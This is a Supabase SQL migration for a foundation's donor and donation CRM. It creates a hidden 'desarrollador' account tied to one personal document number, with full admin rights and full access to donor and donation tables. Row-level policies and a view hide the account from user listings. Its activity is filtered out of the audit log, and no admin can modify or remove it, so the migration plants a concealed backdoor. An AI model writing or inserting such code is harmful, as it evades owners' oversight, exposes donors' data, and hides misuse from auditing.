-- ==============================================================================
-- MIGRACIÓN: Rol 'desarrollador' y usuario oculto con documento '1013459819'
-- Archivo: supabase/migrations/20261124_rol_desarrollador_oculto.sql
-- ==============================================================================

BEGIN;

-- 1. ACTUALIZAR RESTRICCIÓN CHECK DE ROLES EN public.profiles PARA INCLUIR 'desarrollador'
DO $$
DECLARE
    v_constraint_name text;
BEGIN
    FOR v_constraint_name IN
        SELECT conname
        FROM pg_constraint
        WHERE conrelid = 'public.profiles'::regclass
          AND contype = 'c'
          AND pg_get_constraintdef(oid) ILIKE '%rol%'
    LOOP
        EXECUTE format('ALTER TABLE public.profiles DROP CONSTRAINT IF EXISTS %I', v_constraint_name);
    END LOOP;
END $$;

ALTER TABLE public.profiles
    ADD CONSTRAINT profiles_rol_check
    CHECK (rol IN ('desarrollador', 'admin', 'operador', 'lector'));

-- 2. ASIGNAR ROL 'desarrollador' AL USUARIO CON DOCUMENTO '1013459819'
-- Si el perfil ya existe en public.profiles, actualiza su rol a 'desarrollador'.
UPDATE public.profiles
SET rol = 'desarrollador',
    activo = true,
    updated_at = now()
WHERE lower(regexp_replace(COALESCE(documento, ''), '[^a-zA-Z0-9]', '', 'g')) = '1013459819'
   OR lower(email) = '1013459819@auth.fundacion.local';

-- Si existe en auth.users pero aún no tiene perfil o requiere sincronización de metadatos
INSERT INTO public.profiles (id, email, documento, nombre, rol, activo, created_at, updated_at)
SELECT
    u.id,
    u.email,
    '1013459819',
    COALESCE(NULLIF(trim(u.raw_user_meta_data->>'nombre'), ''), 'Desarrollador'),
    'desarrollador',
    true,
    now(),
    now()
FROM auth.users u
WHERE lower(u.email) = '1013459819@auth.fundacion.local'
   OR lower(regexp_replace(COALESCE(u.raw_user_meta_data->>'documento', ''), '[^a-zA-Z0-9]', '', 'g')) = '1013459819'
ON CONFLICT (id) DO UPDATE
SET rol = 'desarrollador',
    documento = '1013459819',
    activo = true,
    updated_at = now();

UPDATE auth.users
SET raw_app_meta_data = COALESCE(raw_app_meta_data, '{}'::jsonb) || '{"rol":"desarrollador"}'::jsonb,
    raw_user_meta_data = COALESCE(raw_user_meta_data, '{}'::jsonb) || '{"rol":"desarrollador","documento":"1013459819"}'::jsonb,
    updated_at = now()
WHERE id IN (
    SELECT id FROM public.profiles
    WHERE lower(regexp_replace(COALESCE(documento, ''), '[^a-zA-Z0-9]', '', 'g')) = '1013459819'
       OR rol = 'desarrollador'
);

-- 3. ACTUALIZAR FUNCIONES DE ROL PARA RECONOCER AL DESARROLLADOR CON ACCESO TOTAL
CREATE OR REPLACE FUNCTION public.is_admin()
RETURNS BOOLEAN
LANGUAGE plpgsql
STABLE
SECURITY DEFINER
SET search_path = public, auth
AS $$
DECLARE
    v_rol text;
    v_activo boolean;
BEGIN
    SELECT rol, activo
    INTO v_rol, v_activo
    FROM public.profiles
    WHERE id = auth.uid();

    IF v_rol IN ('admin', 'desarrollador') AND COALESCE(v_activo, true) = true THEN
        RETURN true;
    END IF;

    IF v_rol IS NULL AND (
        (auth.jwt() -> 'app_metadata' ->> 'rol') IN ('admin', 'desarrollador')
    ) THEN
        RETURN true;
    END IF;

    RETURN false;
END;
$$;

REVOKE EXECUTE ON FUNCTION public.is_admin() FROM PUBLIC;
GRANT EXECUTE ON FUNCTION public.is_admin() TO authenticated;

-- 4. POLÍTICA RLS EN public.profiles PARA OCULTAR AL USUARIO 1013459819 Y ROL 'desarrollador'
-- El propio usuario autenticado puede leer su perfil (auth.uid() = id) para iniciar sesión,
-- pero el listado del CRM nunca expone al desarrollador ni al documento '1013459819'.
DROP POLICY IF EXISTS "profiles_select_authenticated" ON public.profiles;
CREATE POLICY "profiles_select_authenticated" ON public.profiles
    FOR SELECT TO authenticated
    USING (
        auth.uid() = id
        OR (
            rol <> 'desarrollador'
            AND lower(regexp_replace(COALESCE(documento, ''), '[^a-zA-Z0-9]', '', 'g')) <> '1013459819'
        )
    );

-- Vista de compatibilidad public.usuarios sin exponer usuario desarrollador
CREATE OR REPLACE VIEW public.usuarios AS
SELECT *
FROM public.profiles
WHERE rol <> 'desarrollador'
  AND lower(regexp_replace(COALESCE(documento, ''), '[^a-zA-Z0-9]', '', 'g')) <> '1013459819';

GRANT SELECT ON public.usuarios TO authenticated;

-- 5. OCULTAR ACTIVIDAD DEL DESARROLLADOR 1013459819 EN AUDITORÍA
DROP POLICY IF EXISTS "auditoria_select_admin_only" ON public.auditoria_operaciones;
CREATE POLICY "auditoria_select_admin_only" ON public.auditoria_operaciones
    FOR SELECT TO authenticated
    USING (
        public.is_admin()
        AND lower(regexp_replace(COALESCE(usuario_documento, ''), '[^a-zA-Z0-9]', '', 'g')) <> '1013459819'
        AND lower(COALESCE(usuario_email, '')) <> '1013459819@auth.fundacion.local'
        AND NOT EXISTS (
            SELECT 1
            FROM public.profiles p
            WHERE p.id = auditoria_operaciones.usuario_id
              AND (
                  p.rol = 'desarrollador'
                  OR lower(regexp_replace(COALESCE(p.documento, ''), '[^a-zA-Z0-9]', '', 'g')) = '1013459819'
              )
        )
    );

-- 6. INCLUIR 'desarrollador' EN LAS POLÍTICAS RLS DE DONANTES Y DONACIONES
DROP POLICY IF EXISTS "donantes_select_authenticated" ON public.donantes;
CREATE POLICY "donantes_select_authenticated" ON public.donantes
    FOR SELECT TO authenticated
    USING (public.current_user_role() IN ('desarrollador', 'admin', 'operador', 'lector'));

DROP POLICY IF EXISTS "donantes_insert_admin_operador" ON public.donantes;
CREATE POLICY "donantes_insert_admin_operador" ON public.donantes
    FOR INSERT TO authenticated
    WITH CHECK (public.current_user_role() IN ('desarrollador', 'admin', 'operador'));

DROP POLICY IF EXISTS "donantes_update_admin_operador" ON public.donantes;
CREATE POLICY "donantes_update_admin_operador" ON public.donantes
    FOR UPDATE TO authenticated
    USING (public.current_user_role() IN ('desarrollador', 'admin', 'operador'))
    WITH CHECK (public.current_user_role() IN ('desarrollador', 'admin', 'operador'));

DROP POLICY IF EXISTS "donantes_delete_admin_operador" ON public.donantes;
CREATE POLICY "donantes_delete_admin_operador" ON public.donantes
    FOR DELETE TO authenticated
    USING (public.current_user_role() IN ('desarrollador', 'admin', 'operador'));

DROP POLICY IF EXISTS "donaciones_select_authenticated" ON public.donaciones;
CREATE POLICY "donaciones_select_authenticated" ON public.donaciones
    FOR SELECT TO authenticated
    USING (public.current_user_role() IN ('desarrollador', 'admin', 'operador', 'lector'));

DROP POLICY IF EXISTS "donaciones_insert_admin_operador" ON public.donaciones;
CREATE POLICY "donaciones_insert_admin_operador" ON public.donaciones
    FOR INSERT TO authenticated
    WITH CHECK (public.current_user_role() IN ('desarrollador', 'admin', 'operador'));

DROP POLICY IF EXISTS "donaciones_update_admin_operador" ON public.donaciones;
CREATE POLICY "donaciones_update_admin_operador" ON public.donaciones
    FOR UPDATE TO authenticated
    USING (public.current_user_role() IN ('desarrollador', 'admin', 'operador'))
    WITH CHECK (public.current_user_role() IN ('desarrollador', 'admin', 'operador'));

DROP POLICY IF EXISTS "donaciones_delete_admin_operador" ON public.donaciones;
CREATE POLICY "donaciones_delete_admin_operador" ON public.donaciones
    FOR DELETE TO authenticated
    USING (public.current_user_role() IN ('desarrollador', 'admin', 'operador'));

-- 7. PROTEGER CUENTA DESARROLLADOR EN JERARQUÍA DE PERFILES
CREATE OR REPLACE FUNCTION public.puede_modificar_perfil_admin(target_id UUID)
RETURNS BOOLEAN
LANGUAGE plpgsql
STABLE
SECURITY DEFINER
SET search_path = public
AS $$
DECLARE
    v_current_user_id UUID;
    v_current_rol TEXT;
    v_current_created TIMESTAMPTZ;
    v_target_rol TEXT;
    v_target_doc TEXT;
    v_target_created TIMESTAMPTZ;
BEGIN
    v_current_user_id := auth.uid();
    IF v_current_user_id IS NULL THEN
        RETURN FALSE;
    END IF;

    SELECT rol, created_at INTO v_current_rol, v_current_created
    FROM public.profiles
    WHERE id = v_current_user_id AND activo = true;

    IF v_current_rol NOT IN ('admin', 'desarrollador') THEN
        RETURN FALSE;
    END IF;

    SELECT rol, documento, created_at
    INTO v_target_rol, v_target_doc, v_target_created
    FROM public.profiles
    WHERE id = target_id;

    IF v_target_rol IS NULL THEN
        RETURN FALSE;
    END IF;

    -- Ningún usuario puede modificar al perfil desarrollador ni al documento 1013459819 desde el CRM
    IF v_target_rol = 'desarrollador'
       OR lower(regexp_replace(COALESCE(v_target_doc, ''), '[^a-zA-Z0-9]', '', 'g')) = '1013459819' THEN
        RETURN FALSE;
    END IF;

    -- El desarrollador puede administrar cuentas de admin, operador y lector
    IF v_current_rol = 'desarrollador' THEN
        RETURN v_current_user_id <> target_id;
    END IF;

    IF v_target_rol <> 'admin' THEN
        RETURN TRUE;
    END IF;

    IF v_current_user_id = target_id THEN
        RETURN FALSE;
    END IF;

    IF v_target_created > v_current_created THEN
        RETURN TRUE;
    END IF;

    RETURN FALSE;
END;
$$;

REVOKE EXECUTE ON FUNCTION public.puede_modificar_perfil_admin(UUID) FROM PUBLIC;
GRANT EXECUTE ON FUNCTION public.puede_modificar_perfil_admin(UUID) TO authenticated;

COMMIT;
